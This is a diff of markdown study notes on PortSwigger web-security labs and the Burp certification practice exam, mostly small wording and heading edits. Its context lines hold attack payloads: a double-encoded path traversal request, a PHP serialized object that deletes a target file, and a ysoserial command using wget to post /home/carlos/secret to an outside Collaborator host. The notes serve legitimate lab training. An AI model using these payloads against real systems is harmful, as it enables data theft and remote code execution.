@@ -1924,7 +1924,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ![info-disclose](images/info-disclose.png)  
 
->Reviewing PHP source code by adding ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice **desctruct** method.  
+>Reviewing PHP source code by adding tilde ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice the **desctruct** method.  
 
 ![comments-in-source-code](images/comments-in-source-code.png)  
 
@@ -1952,9 +1952,9 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
   
-### YsoSerial  
+### Burp Deserialization Scanner  
 
->Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**.  
+>Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**. This challenge is from the [Burp Practice exam](https://portswigger.net/web-security/certification/practice-exam).  
 
 ![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
 
@@ -1966,8 +1966,10 @@ CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secre
 
 ![ysoserial-rce](images/ysoserial-rce.png)  
 
+### YsoSerial  
+
 >Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.  
->**IMPORTANT:** If you get error message when executing ```java -jar ysoserial <Payload>``` saying something in lines of ***java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets***, the switch to alternative java on linux with following commands.  
+>**IMPORTANT:** If you get error message when executing ```java -jar ysoserial <Payload>``` saying something in lines of ***java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets***, the switch to alternative Java on Linux with following commands.  
 
 ```bash
 java --version
